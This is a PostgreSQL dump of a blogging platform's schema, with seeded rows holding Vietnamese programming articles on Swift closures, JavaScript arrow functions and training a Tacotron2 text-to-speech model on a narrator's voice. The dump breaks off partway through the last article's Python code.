--
-- PostgreSQL database dump
--

-- Dumped from database version 14.6 (Debian 14.6-1.pgdg110+1)
-- Dumped by pg_dump version 14.6 (Debian 14.6-1.pgdg110+1)

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

SET default_tablespace = '';

SET default_table_access_method = heap;

--
-- Name: comments; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.comments (
    comment_id integer NOT NULL,
    user_id integer NOT NULL,
    story_id integer NOT NULL,
    content character varying(255) NOT NULL,
    "createdAt" timestamp with time zone,
    "updatedAt" timestamp with time zone
);


ALTER TABLE public.comments OWNER TO postgres;

--
-- Name: drafts; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.drafts (
    id integer NOT NULL,
    contents text NOT NULL,
    contents_short text NOT NULL,
    media_list character varying(255)[],
    author_id integer NOT NULL,
    title character varying(255) NOT NULL,
    tag character varying(255)[] NOT NULL,
    "isPremium" boolean NOT NULL,
    "createdAt" timestamp with time zone,
    "updatedAt" timestamp with time zone
);


ALTER TABLE public.drafts OWNER TO postgres;

--
-- Name: drafts_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.drafts_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.drafts_id_seq OWNER TO postgres;

--
-- Name: drafts_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.drafts_id_seq OWNED BY public.drafts.id;


--
-- Name: reactions; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.reactions (
    user_id integer NOT NULL,
    story_id integer NOT NULL,
    react_type integer NOT NULL,
    "createdAt" timestamp with time zone,
    "updatedAt" timestamp with time zone
);


ALTER TABLE public.reactions OWNER TO postgres;

--
-- Name: roles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.roles (
    id integer NOT NULL,
    "roleName" character varying(255),
    "createdAt" timestamp with time zone NOT NULL,
    "updatedAt" timestamp with time zone NOT NULL
);


ALTER TABLE public.roles OWNER TO postgres;

--
-- Name: stories; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.stories (
    id integer NOT NULL,
    contents text NOT NULL,
    contents_short text NOT NULL,
    media_list character varying(255)[],
    author_id integer NOT NULL,
    title character varying(255) NOT NULL,
    tag character varying(255)[] NOT NULL,
    views integer DEFAULT 0 NOT NULL,
    "isPremium" boolean NOT NULL,
    "createdAt" timestamp with time zone,
    "updatedAt" timestamp with time zone
);


ALTER TABLE public.stories OWNER TO postgres;

--
-- Name: stories_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.stories_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.stories_id_seq OWNER TO postgres;

--
-- Name: stories_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.stories_id_seq OWNED BY public.stories.id;


--
-- Name: users; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users (
    id integer NOT NULL,
    username character varying(255) NOT NULL,
    email character varying(255) NOT NULL,
    password character varying(255) NOT NULL,
    first_name character varying(255) NOT NULL,
    last_name character varying(255) NOT NULL,
    avatar character varying(255),
    bio character varying(255),
    "isActivate" boolean DEFAULT true,
    "isPremium" boolean DEFAULT false,
    "createdAt" timestamp with time zone,
    "updatedAt" timestamp with time zone
);


ALTER TABLE public.users OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
--

CREATE SEQUENCE public.users_id_seq
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;


ALTER TABLE public.users_id_seq OWNER TO postgres;

--
-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
--

ALTER SEQUENCE public.users_id_seq OWNED BY public.users.id;


--
-- Name: users_roles; Type: TABLE; Schema: public; Owner: postgres
--

CREATE TABLE public.users_roles (
    "createdAt" timestamp with time zone NOT NULL,
    "updatedAt" timestamp with time zone NOT NULL,
    "roleId" integer NOT NULL,
    "userId" integer NOT NULL
);


ALTER TABLE public.users_roles OWNER TO postgres;

--
-- Name: drafts id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.drafts ALTER COLUMN id SET DEFAULT nextval('public.drafts_id_seq'::regclass);


--
-- Name: stories id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.stories ALTER COLUMN id SET DEFAULT nextval('public.stories_id_seq'::regclass);


--
-- Name: users id; Type: DEFAULT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.users ALTER COLUMN id SET DEFAULT nextval('public.users_id_seq'::regclass);


--
-- Data for Name: comments; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.comments (comment_id, user_id, story_id, content, "createdAt", "updatedAt") FROM stdin;
\.


--
-- Data for Name: drafts; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.drafts (id, contents, contents_short, media_list, author_id, title, tag, "isPremium", "createdAt", "updatedAt") FROM stdin;
\.


--
-- Data for Name: reactions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.reactions (user_id, story_id, react_type, "createdAt", "updatedAt") FROM stdin;
\.


--
-- Data for Name: roles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.roles (id, "roleName", "createdAt", "updatedAt") FROM stdin;
1	user	2022-12-18 15:29:50.455+00	2022-12-18 15:29:50.455+00
2	admin	2022-12-18 15:29:50.47+00	2022-12-18 15:29:50.47+00
\.


--
-- Data for Name: stories; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.stories (id, contents, contents_short, media_list, author_id, title, tag, views, "isPremium", "createdAt", "updatedAt") FROM stdin;
31836	Closure, chắc hẳn là một khái niệm đã quá quen, nhưng còn @escaping, @non-escaping, @autoclosure? Liệu bạn đã hiểu rõ bản chất của nó cùng cách sử dụng chưa? Hãy cùng tìm hiểu sâu hơn về tất cả những khái niệm trên trong bài viết này nhé.\n\n> Closures are self-contained blocks of functionality that can be passed around and used in your code.\n\nClosures có thể capture và lưu trữ tham chiếu tới bất cứ constants và biến nào từ context mà nó được định nghĩa. Có thể hiểu closure là một function không có tên, và nó capture bất kỳ giá trị nào trong môi trường của nó. Function và closure là first-class object trong Swift, tức là ta có thể lưu trữ, truyền chúng như arguments trong function, và đối xử với chúng theo cách mà ta làm với những giá trị khác hay object khác. Truyền closure như completion handler là một phương thức phổ biến trong các API. Thư viện Standar Swift sử dụng closure phần lớn vào mục đích xử lý event và callbacks.\n\nTrước khi tìm hiểu về closure, hãy cùng điểm qua các khái niệm của function đã nhé.\n\n### Function là gì?\nFunctions là những đoạn code được đóng gói lại nhằm thực hiện một task cụ thể nào đó. Ta cần cung cấp tên function theo sát chức năng của nó, và sử dụng tên này để gọi function khi cần. Functions có thể không có param hoặc có nhiều param, và trả về nhiều param hoặc không trả gì.\n\n```\nfunc sumOf(_ a: Int, _ b: Int) -> Int {\n    return a + b\n}\n```\n\n### Function Types\nFunction type được tạo bởi param type và return type của function đó. Như trong ví dụ trên, thì function type của nó là (Int, Int) -> Int\n\nFunction type có thể được sử dụng như là param hoặc return type của một function, và nó được gán cho biến như sau:\n\n`var mathFunction: (Int, Int) -> Int = sumOf`\n\nFunction là một trường hợp đặc biệt của closures. Closure xuất hiện dưới ba dạng sau:\n- Global functions: Có tên và không thể capture giá trị\n- Nested functions: Có tên và có thể capture giá trị từ function lồng ngoài đang chứa nó\n- Closure expressions: Không có tên và có thể capture giá trị từ những nội dung quanh nó\n\n### Closure Expression:\nClosure được tạo ra bằng việc đặt một function type bên trong dấu ngoặc móc và từ khoá "in" phía sau return type:\n\n```\n{ (params) -> (returnType) in\n    // Statement\n}\n```\n\nHãy cùng xem qua ví dụ sau:\n```\n// No parameter and return nothing\nlet sayHello: () -> Void = {\n    print("Hello")\n}\n\nsayHello()\n\n// Closure take one parameter and return 1 parameter\nlet value: (Int) -> Int = { (value1) in\n    return value1\n}\n```\n\n### Viết tắt tên của argument\nCác argument của closure có thể được truy cập bằng cách gọi đến vị trí của chúng, ví dụ như $0, $1, $2...\n\n```\nlet digitSquare: (Int) -> Int {\n    print($0)\n    return $0 * $0\n}\n```\n\n\n### Return ngầm từ closure\nNhững closure chỉ có một câu lệnh đơn có thể trả kết quả theo kiểu ngầm mà không cần sử dụng từ khoá return.\n\n```\nlet digitSquare: (Int) -> Int { $0 * $0 }\n```\n\n### Trailing closure\nNếu ta cần truyền closure expression khá dài như là param cuối cùng của một function, thì nó có thể được viết như một trailing closure. Trailing closure được viết ngay sau dấu ngoặc đơn của function dù rằng nó vẫn là một tham số của function. Khi sử dụng trailing closure, ta không khai báo tên cho tham số này.\n\nTheo cách thông thường khi khai báo và sử dụng closure:\n```\n    func sumOf(a: Int, b: Int, onCompletion: (Int) -> Void) {\n        let sum = a + b\n        onCompletion(sum)\n    }\n    \n    func test() {\n        sumOf(a: 10, b: 23, onCompletion: { sum in\n            print("Sum is: ", sum)\n        })\n    }\n```\n\nSử dụng trailing closure khi closure là tham số cuối cùng của function:\n```\n    func sumOf(a: Int, b: Int, onCompletion: (Int) -> Void) {\n        let sum = a + b\n        onCompletion(sum)\n    }\n    \n    func test() {\n        sumOf(a: 10, b: 23) { sum in\n            print("Sum is: ", sum)\n        }\n    }\n```\n\n### Capturing Values\nClosure có thể lưu lại constant và variable từ bối cảnh xung quanh nơi mà nó được định nghĩa. Sau đó, closure này sẽ tham chiếu tới và thay đổi giá trị của constant và variable ngay bên trong closure, ngay cả khi phạm vi gốc định nghĩa những giá trị này đã được giải phóng. Ví dụ đơn giản nhất của việc capture value là function lồng, function này được viết ngay bên trong nội dung của một function khác. Function lồng có thể capture các tham số của function cha, và cả những constant, variable được định nghĩa bên trong function đó.\n\nHãy cũng xem qua ví dụ sau để hiểu rõ hơn:\n```\nfunc makeIncrementer(forIncrement amount: Int) -> () -> Int {\n    var runningTotal = 0\n    func incrementer() -> Int {\n        runningTotal += amount\n        return runningTotal\n    }\n    return incrementer\n}\n```\n\nĐể tối ưu hoá, Swift có thể capture và lưu lại một bản copy của giá trị nếu giá trị đó không bị thay đổi bởi closure, và nếu giá trị đó không bị thay đổi sau khi closure được tạo ra. Swift cũng xử lý tất cả việc quản lý bộ nhớ liên quan đến giải phóng các biến khi chúng không còn cần đến nữa.\n\nNgoài ra để đơn giản hoá những closure quá dài trong đối số của function, ta có thể sử dụng typealias.\n\n### Non-escaping Closures\nCác param của closure mặc định thoát khỏi closure ở các phiên bản trước Swift 3. Một closure sẽ không thoát khỏi nội dung của function nếu closure param được đánh dấu là non-escaping. Từ Swift 3, mọi thứ được đảo ngược. Khi ta truyền closure như một tham số của function, closure được thực thi với function body và trả về compiler. Khi việc thực thi kết thúc, closure được truyền vào sẽ thoát khỏi phạm vi của function và không còn tồn tại trong bộ nhớ.\n\nLưu ý:\n> Closure param mặc định là non-escaping, sử dụng từ khoá @escaping với closure param để thoát khỏi thực thi của closure.\n\nNon-escaping closure có vòng đời như sau:\n- Truyền closure vào làm tham số của function\n- Thực thi function và closure\n- Function return\n\n\n### Escaping Closures\nMột closure được gọi là escape khỏi function khi closure này được truyền vào function làm tham số, nhưng được gọi đến sau khi function return. Việc đánh dấu closure với từ khoá @escaping sẽ báo cho ta biết ta cần phải tham chiếu tới self bên trong closure. Khi khai báo function với param có chứa một closure, ta có thể dùng @escaping trước param type để chỉ định rằng closure này được phép escape.\n\nĐể closure có thể escape ta có thể lưu nó bên trong một variable được định nghĩa bên ngoài function. Ví dụ, có nhiều function bắt đầu một operation bất đồng bộ có closure argument như một completion handler. Function này trả về sau khi nó bắt đầu operation, nhưng closure vẫn chưa được gọi đến cho đến khi operation được hoàn thành, vì vậy closure cần phải escape, để được gọi sau này. Hãy cùng xem ví dụ sau:\n\n```\nvar completionHandlers: [() -> Void] = []\nfunc someFunctionWithEscapingClosure(completionHandler: @escaping () -> Void) {\n    completionHandlers.append(completionHandler)\n}\n```\n\nFunction someFunctionWithEscapingClosure() sử dụng một closure như tham số của nó và thêm nó vào một mảng được định nghĩa bên ngoài function. Nếu ta không dùng @escaping với param của function thì ta sẽ gặp phải lỗi từ compiler. \n\nSử dụng @escaping với closure, ta phải tham chiếu tới self bên trong closure. Ví dụ, với đoạn code trên, closure truyền vào someFunctionWithEscapingClosure() là một escaping closure, nghĩa là nó cần phải tham chiếu tới self. Ngược lại, nếu closure non-escaping thì nó có thể hoặc không cần tham chiếu tới self.\n\n```\nfunc someFunctionWithNonescapingClosure(closure: () -> Void) {\n    closure()\n}\n\nclass SomeClass {\n    var x = 10\n    func doSomething() {\n        someFunctionWithEscapingClosure { self.x = 100 }\n        someFunctionWithNonescapingClosure { x = 200 }\n    }\n}\n\nlet instance = SomeClass()\ninstance.doSomething()\nprint(instance.x)\n// Prints "200"\n\ncompletionHandlers.first?()\nprint(instance.x)\n// Prints "100"\n```\n\n### Autoclosures\nThuộc tính @autoclosure cho phép ta định nghĩa một tham số mà nó tự động được bọc bên trong một closure. Nó không có bất cứ tham số nào, và khi được gọi tới, nó trả về giá trị của expression được bọc bên trong nó. Cú pháp tiện lợi này giúp ta có thể bỏ đi dấu ngoặc quanh function param bằng cách viết expression bình thường thay vì phải viết rõ closure ra.\n\nVí dụ, function assert(condition:message:file:line:) sử dụng một autoclosure cho câu lệnh điều kiện và tham số của message, tham số điều kiện của nó được thực thi chỉ ở chế độ build debug và tham số message được thực thi nếu điều kiện bị false.\n\n```\nfunc assert(_ expression: @autoclosure () -> Bool,\n            _ message: @autoclosure () -> String) {}\n```\n\nMột autoclosure cho phép ta trì hoãn việc thực thi, bởi code bên trong closure sẽ không được chạy cho đến khi ta gọi closure. Việc này sẽ hữu ích đối với những đoạn code có tác dụng phụ hoặc tốn kém, bởi nó giúp ta quản lý được khi nào thì thực thi code. Hãy cùng xem ví dụ sau:\n\n```\nvar customersInLine = ["Chris", "Alex", "Ewa", "Barry", "Daniella"]\nprint(customersInLine.count)\n// Prints "5"\n\nlet customerProvider = { customersInLine.remove(at: 0) }\nprint(customersInLine.count)\n// Prints "5"\n\nprint("Now serving \\(customerProvider())!")\n// Prints "Now serving Chris!"\nprint(customersInLine.count)\n// Prints "4"\n```\n\nMặc dù thành phần đầu tiên của mảng customersInLine bị loại bỏ bởi đoạn code bên trong closure, nhưng nó vẫn không bị loại cho đến khi closure thực sự được gọi đến. Nếu closure không bao giờ được gọi, thì closure sẽ không bao giờ thực thi, nghĩa là phần tử của mảng cũng sẽ không bao giờ bị loại đi. Ngoài ra, type của customerProvider không phải là String mà là () -> String (một function không có param và trả về một String).\n\nTa cũng sẽ nhận được kết quả của trì hoãn thực thi như trên khi truyền closure làm param của một function.\n\n\n```\n// customersInLine is ["Alex", "Ewa", "Barry", "Daniella"]\nfunc serve(customer customerProvider: () -> String) {\n    print("Now serving \\(customerProvider())!")\n}\nserve(customer: { customersInLine.remove(at: 0) } )\n// Prints "Now serving Alex!"\n```\n\nFunction serve(customer:) ở trên nhận một explicit closure làm param và trả về tên của customer. Còn trong phiên bản dưới đây của serve(customer:) thì nó cũng thực thi cùng một nhiệm vụ, nhưng thay vì nhận param là explicit closure, nó nhận một autoclosure được đánh dấu bằng từ khoá @autoclosure. Nhờ vậy ta có thể gọi đến function với String argument thay vì sử dụng closure. Argument này sẽ tự động được chuyển đổi thành một closure nhờ nó là một thuộc tính @autoclosure.\n\n```\n// customersInLine is ["Ewa", "Barry", "Daniella"]\nfunc serve(customer customerProvider: @autoclosure () -> String) {\n    print("Now serving \\(customerProvider())!")\n}\nserve(customer: customersInLine.remove(at: 0))\n// Prints "Now serving Ewa!"\n```\n\nNếu bạn muốn một autoclosure cho phép escape, thì hãy sử dụng cả hai từ khoá @autoclosure và @escaping.	Closure, chắc hẳn là một khái niệm đã quá quen, nhưng còn @escaping, @non-escaping, @autoclosure? Liệu bạn đã hiểu rõ bản chất của nó cùng cách sử dụng chưa? Hãy cùng tìm hiểu sâu hơn về tất cả những khái niệm trên trong bài viết này nhé.\n\nClosures are self-contained blocks of functionality that can be passed around and used in your code.\n\nClosures có thể capture và lưu trữ tham chiếu tới bất c...	{}	1	Tìm hiểu về closures trong Swift	{swift,ios,closure}	0	f	2022-12-18 15:33:37.406+00	2022-12-18 15:33:37.406+00
32033	Arrow Functions - một tính năng mới được giới thiệu trong ES6 - cho phép viết các hàm súc tích trong JavaScript. Mặc dù cả Regular Functions và Arrow Functions hoạt động theo cách giống nhau, nhưng có một số khác biệt thú vị nhất định giữa chúng.\nCùng khám phá nó ở dưới đây.\n### Syntax\n\nSyntax của  một fuction bình thuờng:\n\n```javascript\nlet x = function function_name(parameters){ \n   // body of the function \n}; \n```\nVí dụ:\n\n```javascript\nlet square = function(x){ \n  return (x*x); \n}; \nconsole.log(square(9)); \n```\nKết quả:\n![](https://images.viblo.asia/40c9ef7e-70e8-4a6b-94c7-db55b02fc62b.png)\n\nSyntax của arrow functions:-\n```javascript\nlet x = (parameters) => { \n    // body of the function \n}; \n```\nVí dụ:\n\n```javascript\nvar square = (x) => { \n    return (x*x); \n}; \nconsole.log(square(9)); \n```\nKết quả:\n![](https://images.viblo.asia/40c9ef7e-70e8-4a6b-94c7-db55b02fc62b.png)\n\n\n### Từ khóa this\nKhông giống như function bình thuờng, arrow functions sẽ không có this của nó. Hãy xem qua các ví dụ bên dưới để hiểu hơn.\n\nVí dụ:\n```javascript\nlet user = { \n    name: "GFG", \n    gfg1:() => { \n        console.log(this.name)\n        console.log("hello " + this.name); // no 'this' binding here \n    }, \n    gfg2(){        \n        console.log("Welcome to " + this.name); // 'this' binding works here \n    }   \n }; \nuser.gfg1(); \nuser.gfg2(); \n```\nKết quả:\n![](https://images.viblo.asia/2fc370b4-f82f-4887-9500-883f744eea4a.png)\n\nChúng ta hãy cùng nhìn lại một chút.\nỞ đây gfg1được khai báo là một array fucntion nên cái this của nó không nằm ở user nữa mà nó là một cái gì đó ở ngoài user, có thể là window, document...\nNgược lại thì gfg2 là một regular function nên this.name, nó sẽ hiểu là user.name, nên nó sẽ lấy giá trị của user.name\n\nĐể làm rõ hơn một chút, chúng ta sẽ sửa code thành thế này:\n```javascript\nname = "Foo Bar"\nlet user = { \n    name: "GFG", \n    gfg1:() => { \n        console.log("hello " + this.name); // no 'this' binding here \n    }, \n    gfg2(){        \n        console.log("Welcome to " + this.name); // 'this' binding works here \n    }   \n }; \nuser.gfg1(); \nuser.gfg2(); \n```\nChúng ta sẽ được kết quả như thế này:\n\n![](https://images.viblo.asia/dee01e7a-db5c-401d-b09c-e6bb00e8041b.png)\n\n### Availability of arguments objects\n\nChúng ta không thể sử dụng arguments trong arrow function, nhưng ở regular functions thì chúng ta có thể sử dụng được.\nArguments objects là gì thì các bạn hãy xem lại [ở đây](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/arguments).\n\nVí dụ sử dụng regular functions:\n\n```javascript\nlet user = {       \n    show(){ \n        console.log(arguments); \n    } \n}; \nuser.show(1, 2, 3); \n```\nKết quả:\n![](https://images.viblo.asia/0d12db8a-e8d9-4348-9081-ef5ee31286e3.png)\n\nSử dụng arrow function:\n\n```javascript\nlet user = {      \n        show_ar : () => { \n        console.log(...arguments); \n    } \n}; \nuser.show_ar(1, 2, 3); \n```\nKết quả:\n\n![](https://images.viblo.asia/36a77d35-75de-49c5-8b76-a3aa975553f4.png)\n\n### Sử dụng từ khóa new\n\nRegular functions created using function declarations or expressions are ‘constructible’ and ‘callable’. Since regular functions are constructible, they can be called using the ‘new’ keyword. However, the arrow functions are only ‘callable’ and not constructible. Thus, we will get a run-time error on trying to construct a non-constructible arrow functions using the new keyword.\n\nRegular functions được tạo bằng cách sử dụng khai báo hàm hoặc biểu thức là *constructible* và *callable*. Vì regular function có thể constructible, chúng có thể được gọi bằng cách sử dụng từ khóa **new**. Tuy nhiên, arrow function thì  chỉ là *callable* và không *constructible*. Do đó, chúng ta sẽ gặp lỗi khi cố gắng gọi arrow function bằng từ khóa **new**.\n\nVí dụ sử dụng Regular Function:\n\n```javascript\nlet x = function(){ \n    console.log(arguments); \n}; \nnew x(1,2,3); \n```\nKết quả:\n![](https://images.viblo.asia/0f56dcb6-1622-452c-a8ee-f2cf3397e7e5.png)\n\nSử dụng Arrow Function:\n\n```javascript\nlet x = ()=> { \n    console.log(arguments); \n}; \nnew x(1,2,3); \n```\nKết quả:\n![](https://images.viblo.asia/0d745bea-17ad-4352-b42d-1e614fd0484d.png)\n\nTrên đây là một số khác biệt giữa Regular Function và Arrow Function trong ES6. Cám ơn các bạn đã đọc bài viết.\nHẹn gặp mọi người ở bài viết sau.\nHappy hacking!!!	Arrow Functions - một tính năng mới được giới thiệu trong ES6 - cho phép viết các hàm súc tích trong JavaScript. Mặc dù cả Regular Functions và Arrow Functions hoạt động theo cách giống nhau, nhưng có một số khác biệt thú vị nhất định giữa chúng.\nCùng khám phá nó ở dưới đây.\nSyntax\n\nSyntax của  một fuction bình thuờng:\n\nVí dụ:\n\nKết quả:\n\nSyntax của arrow functions:-\nVí dụ:\n\nKết quả:\n\nTừ khóa th...	{https://images.viblo.asia/40c9ef7e-70e8-4a6b-94c7-db55b02fc62b.png,https://images.viblo.asia/40c9ef7e-70e8-4a6b-94c7-db55b02fc62b.png,https://images.viblo.asia/2fc370b4-f82f-4887-9500-883f744eea4a.png,https://images.viblo.asia/dee01e7a-db5c-401d-b09c-e6bb00e8041b.png,https://images.viblo.asia/0d12db8a-e8d9-4348-9081-ef5ee31286e3.png,https://images.viblo.asia/36a77d35-75de-49c5-8b76-a3aa975553f4.png,https://images.viblo.asia/0f56dcb6-1622-452c-a8ee-f2cf3397e7e5.png,https://images.viblo.asia/0d745bea-17ad-4352-b42d-1e614fd0484d.png}	1	Sự khác nhau giữa Regular Functions và Arrow Functions	{es6,js}	0	f	2022-12-18 15:33:37.415+00	2022-12-18 15:33:37.415+00
31996	Xin chào các cháu, chắc hẳn có rất nhiều cháu, nhất là các cháu đam mê truyện ma kinh dị hẳn không còn lạ lẫm gì với những audio truyện ma nổi tiếng của các bác Nguyễn Ngọc Ngạn, Đình Soạn hay bác Hồng Nhung. Tuy nhiên các ông đấy do là phải thường xuyên đọc nhiều nên cũng mỏi mồm lắm các cháu ạ. Thế nên là khi các cháu muốn nghe một truyện mới cũng phải chờ các ông ấy chữa mồm thì mới hi vọng được. Với cả không phải truyện ma nào các ông ấy đọc các cháu cũng thích phải không, có truyện mình thích thì ổng không đọc, có truyện ổng đọc thì mình lại chẳng thích. Như vậy thật là không thú vị phải không nào? Nếu mà có một cách nào để thích nghe truyện gì thì tự các ông ấy phải đọc cho mình nghe một cách tự động thì tốt quá phải không các cháu. Vậy nên hôm nay ông sẽ hướng dẫn các cháu làm một series truyện ma **siêu to khổng lồ** như thế nhé. Ông làm không phải vì tiền đâu nhưng nếu các cháu cho ông một vote up thì ông vui lắm đấy. OK giờ chúng ta bắt đầu thôi. \n\n# Định hướng bài toán\n\nVề cơ bản thì hôm nay ông sẽ hướng dẫn các cháu làm một ứng dụng tự động để đọc truyện ma (chỉ là ví dụ thôi, các cháu có thể tự làm với bất kì loại truyện nào khác). Phần lớn trong bài này nói đến công nghệ tổng hợp tiếng nói và các bước thực hiện trong một bài toán tổng hợp tiếng nói. Với giọng đọc của MC Đình Soạn, ông sẽ sử dụng để làm hướng dẫn cho các cháu. Để thực hiện bài toán này chúng ta cần thực hiện các bước như sau: \n\n* **Chuẩn bị dữ liệu**: Giống như mọi bài toán khác thì bước chuẩn bị dữ liệu là vô cùng cần thiết. Trong bài này ông sẽ hướng dẫn các cháu các bước từ đầu đến cuối đến chuẩn bị cho việc training mô hình. \n* **Tìm hiểu lý thuyết tổng hợp tiếng nói**: Rõ ràng rằng chúng ta cần phải hiểu được cái mà chúng ta đang làm thì chúng ta mới tiến hành làm được phải không nào. Tìm hiểu lý thuyết và làm survey là một bước rất quan trọng trong quá trình làm việc trên thực tế. Các cháu muốn rõ hơn có thể tìm hiểu bài trước đó của ông nhé. Link tại [đây](https://viblo.asia/p/cac-buoc-can-thuc-hien-khi-lam-mot-san-pham-ai-trong-thuc-te-RnB5pyLYKPG)\n* **Lựa chọn và hiểu được lý thuyết mô hình Tacotron2**: **Tacotron2** được coi là một trong những phương pháp tốt nhất hiện nay trong lĩnh vực tổng hợp tiếng nói. Chúng ta sẽ cùng nhau tìm hiểu chi tiết về phương pháp này trong các phần tiếp theo nhé. \n* **Tiền xử lý dữ liệu và lựa chọn tham số**: Việc tiền xử lý dữ liệu là bước không thể thiếu và quyết định khá nhiều đến độ chính xác của mô hình AI mà các cháu làm ra. Đặc biệt việc hiểu và lựa chọn các tham số sao cho phù hợp để training ra được mô hình tốt nhất là một điều mà các cháu nên tìm hiểu.\n* **Training và đánh giá mô hình**: Đây là bước tất nhiên là quan trọng trong quá trình thực hiện một bài toán AI bởi lẽ nếu không\n* **Chạy thử kết quả**: Tất nhiên là sau khi training thì cần thử nghiệm kết quả rồi phải không nào. \n* **Hậu xử lý audio**: Đây là việc khá quan trọng để có được một audio truyện ma hay đó các cháu ạ. Giờ chúng ta sẽ bắt đầu vào chi tiết của từng phần 1 nhé \n\n# Chuẩn bị dữ liệu \n\n## Bước 1: Thu thập dữ liệu mẫu \nBước này là bước quan trọng và cũng là bước mất nhiều thời gian nhất đó các cháu ạ. Để có được dữ liệu **sạch** thì các cháu phải bỏ công sức ra đi tìm những nguồn audio âm thanh có chất lượng thu âm tốt. Ở đây ông sử dụng giọng đọc của MC Đình Soạn - MC truyện ma mà ông khá thích để làm dữ liệu cho các cháu nhé. Các cháu có thể lên trang [nghe đọc truyện](https://truyenaudio.org/giong-doc/mc-dinh-soan.html) để kiếm dữ liệu về. Mỗi một tập truyện dài của Đình Soạn có thể cho chúng ta gần chục giờ dữ liệu. Các cháu chỉ cần làm vài ba truyện là có đến mấy chục giờ dữ liệu thì cũng đủ để training một cái demo nho nhỏ rồi các cháu ạ.\n\n![](https://images.viblo.asia/2a9912e4-97df-4bf7-9bdd-fce4f20e4142.png)\n\n## Bước 2:  Sinh text cho dữ liệu \n\nCác cháu nhớ việc tải dữ liệu audio về thì dễ dàng thôi nhưng đó mới chỉ là bắt đầu của một câu truyện buồn thê lương, sầu thảm mang tên annotate dữ liệu. Về cơ bản đề annotate dữ liệu cho bài toán **Text To Speech** thì không có cách nào khác là các cháu phải tự mình ghi lại text tương ứng với từng đoạn audio đó. Nếu các cháu tự làm việc này thì thật là quá sức tưởng tượng. Tuy nhiên bằng một vài thủ thuật nho nhỏ cũng sẽ đỡ hơn cho các cháu khá nhiều công sức. Về cơ bản chúng ta sẽ sử dụng một thư viện **speech to text** để chuyển audio với thời gian tương ứng thành text. Tuy nhiên do độ chính xác của thư viện có thể chưa chuẩn xác nên cần chúng ta phải validate và sửa lại text cho chính xác. Công việc này tuy khá mất thời gian nhưng còn đỡ hơn là việc chúng ta ngồi gõ lại từ đầu các cháu ạ. Để làm được điều đó chúng ta sử dụng thư viện [autosub](https://github.com/agermanidis/autosub). Cài đặt đơn giản như sau:\n\n```python\npip install autosub\n```\n\nCác cháu nhớ cài **ffmpeg** trước nhé. Sau khi cài đặt xong thì vào trong thư mục chứa các audio đọc truyện ma vừa mới tải về lúc nãy. Chạy từng truyện một. Ví dụ với truyện **ma_bup_be.mp3** thì các cháu chạy lệnh sau:\n\n```go\nautosub -S vi -D vi ma_bup_be.mp3\n```\n\nĐợi khoảng 1 phút cho nó chạy xong, các cháu sẽ thấy được một file dạng subtitle (**ma_bup_be.srt**) trong đó có thời gian bắt đầu và thời gian kết thúc với text tương ứng của từng câu. Theo nhiều lần thí nghiệm của ông thì về mặt thời gian start và end của từng câu thì rất chính xác còn về text thì có câu chuẩn có câu không nên các cháu cần phải điều chỉnh lại nhé. Có rất nhiều phần mềm hỗ trợ việc chỉnh sửa file subtitle nên các cháu phải chịu khó nghe kĩ lại rồi sửa cho đúng nhé. Lười tải app thì có thể dùng trực tiếp bản online tại [đây](https://www.nikse.dk/subtitleedit/online#)\n\n## Bước 3: Cắt dữ liệu thành các file nhỏ\n\nDo việc training **text to speech** sẽ phải tách dữ liệu thành từng cặp câu nhỏ nên các cháu cần phải cắt các cái file **siêu to khổng lồ** kia thành các file **siêu bé tí hon** nhé. Và chúng ta sẽ cần cắt theo thời gian bắt đầu và kết thúc trong file srt. Và do đã tách ra thành nhiều file nhỏ nên chúng ta cần lưu text tương ứng với filename trong một file csv. Output của chúng ta sẽ có dạng như sau các cháu nhé:\n\n![](https://images.viblo.asia/a2df097a-7d15-4d42-b858-038df5deed29.png)\n\nĐể thực hiện điều này các cháu cần thực hiện như sau:\n\n```python\nimport pysrt\nfrom pydub import AudioSegment\n\naudio_name = 'ma_bup_be.mp3'\nsub_name = 'ma_bup_be.srt'\naudio_outdir = 'audios'\ncsv_output = 'output.csv'\n\nsong = AudioSegment.from_file(audio_name)\nsubs = pysrt.open(sub_name, encoding='utf-8')\n\n# Define lambda function convert time to miliseconds \ntime_to_ms = lambda x: (x.hours*3600 + x.minutes * 60 + x.seconds) * 1000 + x.milliseconds\n\n# Extract data \nwith open(csv_output, 'w') as fd:\n    for sub in subs:\n        # Get start time, end time in miliseconds\n        start_ms = time_to_ms(sub.start)\n        end_ms = time_to_ms(sub.end)   \n        # Audio extracted file name\n        